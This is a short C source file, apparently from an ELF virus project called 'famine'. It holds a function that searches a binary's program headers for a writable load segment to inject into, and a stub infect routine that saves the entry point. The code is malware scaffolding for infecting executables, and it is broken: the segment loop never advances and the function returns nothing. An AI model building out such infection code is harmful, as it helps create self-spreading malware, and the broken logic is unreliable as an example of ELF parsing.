#include "../include/famine.h"

Elf64_Phdr *find_data_gap(Elf64_Ehdr *hdr, off_t fsize, t_arg_data *data)
{
    Elf64_Phdr* elf_seg, *data_seg;
    int         n_seg = hdr->e_phnum;
    int         offset_data_end, gap=fsize;

    elf_seg = (Elf64_Phdr *) ((unsigned char*) hdr + (unsigned int) hdr->e_phoff);

    for (int i = 0; i < n_seg; i ++)
    {
        if (elf_seg->p_type == PT_LOAD && (elf_seg->p_flags & PF_R && elf_seg->p_flags & PF_W))
        {
            if (data->debug)
                printf("\t\tFound r+w segment (data segment) at index: %d\n", i);
            data_seg = elf_seg;
            offset_data_end = elf_seg->p_offset + elf_seg->p_filesz;
        }

    }
}

void infect(t_file *file, t_arg_data *data)
{
    file->inject.entry_point = file->inject.header->e_entry ;
    if (data->debug)
        printf("\tInjection possible in %s\n", file->complet_file_name);
    
    // find a gap for PT load R+W (pas d'exec necessaire pour ecrire la string)
}